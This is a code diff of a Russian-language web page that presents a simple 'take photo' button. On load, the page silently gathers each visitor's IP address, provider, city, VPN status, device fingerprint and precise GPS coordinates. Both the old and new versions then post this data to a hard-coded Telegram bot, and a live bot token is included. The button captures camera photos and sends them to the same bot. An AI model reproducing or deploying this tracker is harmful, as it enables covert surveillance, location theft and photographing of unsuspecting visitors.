@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -11,257 +11,275 @@
 
     <button onclick="takePhoto()">Сделать фото</button>
 
-<script>
-    async function getDeviceBrandAndModel() {
-        const userAgent = navigator.userAgent;
-        let deviceBrand = 'Unknown';
-        let deviceModel = 'Unknown';
+    <script>
+        async function getDeviceBrandAndModel() {
+            const userAgent = navigator.userAgent;
+            let deviceBrand = 'Unknown';
+            let deviceModel = 'Unknown';
 
-        if (/android/i.test(userAgent)) {
-            deviceBrand = 'Android';
-            const match = userAgent.match(/;\s(.*?)(?:\sBuild|\))/);
-            if (match) {
-                deviceModel = match[1];
+            if (/android/i.test(userAgent)) {
+                deviceBrand = 'Android';
+                const match = userAgent.match(/;\s(.*?)(?:\sBuild|\))/);
+                if (match) {
+                    deviceModel = match[1];
+                }
+            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                deviceBrand = 'Apple';
+                const match = userAgent.match(/\(([a-zA-Z]+);.*?OS\s([0-9_]+)/);
+                if (match) {
+                    deviceModel = match[1];
+                }
             }
-        } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-            deviceBrand = 'Apple';
-            const match = userAgent.match(/\(([a-zA-Z]+);.*?OS\s([0-9_]+)/);
-            if (match) {
-                deviceModel = match[1];
+
+            return { brand: deviceBrand, model: deviceModel };
+        }
+
+        async function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const deviceInfo = {
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                uptime: Math.round(performance.now() / 1000),
+                webglSupport: supportsWebGL(),
+                fonts: await getFonts(),
+                renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
+            };
+
+            if (/android/i.test(userAgent)) {
+                deviceInfo.device = 'Android';
+            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                deviceInfo.device = 'iOS';
+            } else {
+                deviceInfo.device = 'Unknown';
+            }
+
+            if (/chrome|crios|crmo/i.test(userAgent)) {
+                deviceInfo.browser = 'Chrome';
+            } else if (/firefox|iceweasel|fxios/i.test(userAgent)) {
+                deviceInfo.browser = 'Firefox';
+            } else if (/safari/i.test(userAgent)) {
+                deviceInfo.browser = 'Safari';
+            } else if (/msie|trident/i.test(userAgent)) {
+                deviceInfo.browser = 'Internet Explorer';
+            } else {
+                deviceInfo.browser = 'Unknown';
+            }
+
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                deviceInfo.batteryLevel = battery.level * 100 + '%';
+            } else {
+                deviceInfo.batteryLevel = 'Not supported';
+            }
+
+            return deviceInfo;
+        }
+
+        function supportsWebGL() {
+            try {
+                const canvas = document.createElement('canvas');
+                return !!window.WebGLRenderingContext && !!canvas.getContext('webgl');
+            } catch (e) {
+                return false;
             }
         }
 
-        return { brand: deviceBrand, model: deviceModel };
-    }
-
-    async function getDeviceInfo() {
-        const deviceBrandAndModel = await getDeviceBrandAndModel();
-        const userAgent = navigator.userAgent;
-        const deviceInfo = {
-            model: deviceBrandAndModel.model,
-            device: deviceBrandAndModel.brand,
-            screenResolution: `${window.screen.width}x${window.screen.height}`,
-            language: navigator.language,
-            platform: navigator.platform,
-            location: null,
-            isp: null,
-            vpnStatus: null,
-            webglSupport: supportsWebGL(),
-            fonts: await getFonts(),
-            renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
-            batteryLevel: await getBatteryLevel(),
-            internetSpeed: await checkInternetSpeed()
-        };
-
-        return deviceInfo;
-    }
-
-    function supportsWebGL() {
-        try {
-            const canvas = document.createElement('canvas');
-            return !!window.WebGLRenderingContext && !!canvas.getContext('webgl');
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async function getFonts() {
-        const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Courier', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
-        const availableFonts = [];
-        for (const font of fontList) {
-            if (document.fonts.check(`12px "${font}"`)) {
-                availableFonts.push(font);
+        async function getFonts() {
+            const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Courier', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
+            const availableFonts = [];
+            for (const font of fontList) {
+                if (document.fonts.check(`12px "${font}"`)) {
+                    availableFonts.push(font);
+                }
             }
+            return availableFonts.join(', ');
         }
-        return availableFonts.join(', ');
-    }
 
-    async function getBatteryLevel() {
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            return battery.level * 100 + '%';
-        }
-        return 'Not supported';
-    }
-
-    async function checkInternetSpeed() {
-        const image = new Image();
-        const startTime = new Date().getTime();
-        return new Promise((resolve) => {
+        function checkInternetSpeed() {
+            const image = new Image();
+            const startTime = new Date().getTime();
+            let speed = 0;
             image.onload = function() {
                 const endTime = new Date().getTime();
                 const duration = (endTime - startTime) / 1000;
-                const bitsLoaded = 1024 * 1024 * 8; // 1MB
-                const speed = (bitsLoaded / duration / (1024 * 1024)).toFixed(2); // Mbps
-                resolve(speed);
+                const bitsLoaded = 1024 * 1024 * 8;
+                speed = (bitsLoaded / duration / (1024 * 1024)).toFixed(2);
+                sendSpeedToTelegram(speed);
             };
             image.src = "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png?" + startTime;
-        });
-    }
+        }
 
-    async function sendToTelegram(ipAddress, deviceInfo, location, isp, vpnStatus) {
-        const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-        const chatId = '1653222949';
-        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        function sendSpeedToTelegram(speed) {
+            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
+            const chatId = '1653222949';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        const message = `
-            Модель устройства: ${deviceInfo.model}
-            Устройство: ${deviceInfo.device}
-            Геолокация пользователя: ${location}
-            IP-адрес пользователя: ${ipAddress}
-            Провайдер: ${isp}
-            Разрешение экрана: ${deviceInfo.screenResolution}
-            Язык: ${deviceInfo.language}
-            Платформа: ${deviceInfo.platform}
-            Использование VPN/Proxy: ${vpnStatus}
-            Поддержка WebGL: ${deviceInfo.webglSupport}
-            Установленные шрифты: ${deviceInfo.fonts}
-            Время рендеринга страницы: ${deviceInfo.renderTime} мс
-            Уровень заряда батареи: ${deviceInfo.batteryLevel}
-            Скорость интернета: ${deviceInfo.internetSpeed} Mbps
-        `;
+            const message = `Скорость интернета: ${speed} Mbps`;
 
-        fetch(telegramApiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
             })
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Сообщение отправлено в Telegram:', data);
-        })
-        .catch(error => {
-            console.error('Ошибка при отправке сообщения в Telegram:', error);
-        });
-    }
-
-    function checkVPN(ipAddress) {
-        return fetch(`https://ipapi.co/${ipAddress}/json/`)
             .then(response => response.json())
-            .then(data => data.security ? data.security.is_vpn : 'Unknown')
-            .catch(() => 'Unknown');
-    }
+            .then(data => {
+                console.log('Сообщение отправлено в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке сообщения в Telegram:', error);
+            });
+        }
 
-    function getLocation() {
-        return new Promise((resolve, reject) => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        resolve(`${latitude}, ${longitude}`);
-                    },
-                    (error) => {
-                        reject('Ошибка при получении геолокации: ' + error.message);
-                    }
-                );
-            } else {
-                reject('Геолокация не поддерживается этим браузером.');
+        function sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus, geoLocation) {
+            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
+            const chatId = '1653222949';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const message = `
+                IP-адрес пользователя: ${ipAddress}
+                Устройство: ${deviceInfo.device}
+                Браузер: ${deviceInfo.browser}
+                Провайдер: ${isp}
+                Разрешение экрана: ${deviceInfo.screenResolution}
+                Язык: ${deviceInfo.language}
+                Платформа: ${deviceInfo.platform}
+                Время работы системы: ${deviceInfo.uptime} сек.
+                Местоположение: ${location}
+                Точная геолокация пользователя: ${geoLocation}
+                Использование VPN/Proxy: ${vpnStatus}
+                Поддержка WebGL: ${deviceInfo.webglSupport}
+                Установленные шрифты: ${deviceInfo.fonts}
+                Время рендеринга страницы: ${deviceInfo.renderTime} мс
+                Уровень заряда батареи: ${deviceInfo.batteryLevel}
+            `;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Сообщение отправлено в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке сообщения в Telegram:', error);
+            });
+        }
+
+        function checkVPN(ipAddress) {
+            return fetch(`https://ipapi.co/${ipAddress}/json/`)
+                .then(response => response.json())
+                .then(data => data.security ? data.security.is_vpn : 'Unknown')
+                .catch(() => 'Unknown');
+        }
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                console.log('IP-адрес:', ipAddress);
+
+                fetch(`https://ipapi.co/${ipAddress}/json/`)
+                    .then(response => response.json())
+                    .then(async data => {
+                        const isp = data.org || 'Unknown';
+                        const location = `${data.city}, ${data.region}, ${data.country}`;
+                        console.log('Провайдер:', isp);
+                        console.log('Местоположение:', location);
+
+                        const vpnStatus = await checkVPN(ipAddress);
+                        console.log('Использование VPN/Proxy:', vpnStatus);
+
+                        const deviceInfo = await getDeviceInfo();
+                        console.log('Информация об устройстве:', deviceInfo);
+
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                const geoLocation = `${position.coords.latitude},${position.coords.longitude}`;
+                                sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus, geoLocation);
+                            },
+                            error => {
+                                console.error('Ошибка при получении геолокации:', error);
+                                sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus, 'Не удалось получить');
+                            }
+                        );
+                    })
+                    .catch(error => {
+                        console.error('Ошибка при получении информации о провайдере и местоположении:', error);
+                    });
+            })
+            .catch(error => {
+                console.error('Ошибка при получении IP-адреса:', error);
+            });
+
+        checkInternetSpeed();
+
+        async function takePhoto() {
+            const constraints = {
+                video: { facingMode: "user" }
+            };
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise((resolve) => (video.onloadedmetadata = resolve));
+                video.play();
+
+                const frontCanvas = document.createElement('canvas');
+                frontCanvas.width = video.videoWidth;
+                frontCanvas.height = video.videoHeight;
+                const frontContext = frontCanvas.getContext('2d');
+                frontContext.drawImage(video, 0, 0, frontCanvas.width, frontCanvas.height);
+
+                const photoData = frontCanvas.toDataURL('image/png');
+
+                // Остановить видео-поток
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+
+                // Отправить фото в Telegram
+                sendPhotoToTelegram(photoData);
+            } catch (error) {
+                console.error('Ошибка при захвате фото:', error);
             }
-        });
-    }
-
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(async data => {
-            const ipAddress = data.ip;
-
-            const locationData = await fetch(`https://ipapi.co/${ipAddress}/json/`).then(response => response.json());
-            const isp = locationData.org || 'Unknown';
-            const location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
-            const vpnStatus = await checkVPN(ipAddress);
-
-            const deviceInfo = await getDeviceInfo();
-
-            sendToTelegram(ipAddress, deviceInfo, location, isp, vpnStatus);
-        })
-        .catch(error => {
-            console.error('Ошибка при получении IP-адреса:', error);
-        });
-
-    async function takePhoto() {
-        const constraints = {
-            video: { facingMode: "user" } // Для передней камеры
-        };
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await new Promise((resolve) => (video.onloadedmetadata = resolve));
-            video.play();
-
-            // Захват фото с передней камеры
-            const frontPhoto = captureImage(video);
-            console.log('Фото с передней камеры сделано');
-
-            // Смена на заднюю камеру
-            constraints.video.facingMode = { exact: "environment" };
-            const backStream = await navigator.mediaDevices.getUserMedia(constraints);
-            video.srcObject = backStream;
-            await new Promise((resolve) => (video.onloadedmetadata = resolve));
-            video.play();
-
-            // Захват фото с задней камеры
-            const backPhoto = captureImage(video);
-            console.log('Фото с задней камеры сделано');
-
-            // Отправка фотографий в Telegram-бот
-            sendPhotoToTelegram(frontPhoto, 'Передняя камера');
-            sendPhotoToTelegram(backPhoto, 'Задняя камера');
-
-        } catch (error) {
-            console.error('Ошибка при доступе к камере:', error);
         }
-    }
 
-    function captureImage(video) {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        return canvas.toDataURL('image/png');
-    }
+        function sendPhotoToTelegram(photoData) {
+            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
+            const chatId = '1653222949';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-    function sendPhotoToTelegram(photoData, camera) {
-        const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-        const chatId = '1653222949';
-        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', dataURItoBlob(photoData));
-        formData.append('caption', `Фото с ${camera}`);
-
-        fetch(telegramApiUrl, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Фото отправлено в Telegram:', data);
-        })
-        .catch(error => {
-            console.error('Ошибка при отправке фото в Telegram:', error);
-        });
-    }
-
-    function dataURItoBlob(dataURI) {
-        const byteString = atob(dataURI.split(',')[1]);
-        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-        const ab = new ArrayBuffer(byteString.length);
-        const ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) {
-            ia[i] = byteString.charCodeAt(i);
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: photoData
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Фото отправлено в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке фото в Telegram:', error);
+            });
         }
-        return new Blob([ab], { type: mimeString });
-    }
-</script>
+    </script>
 </body>
 </html>
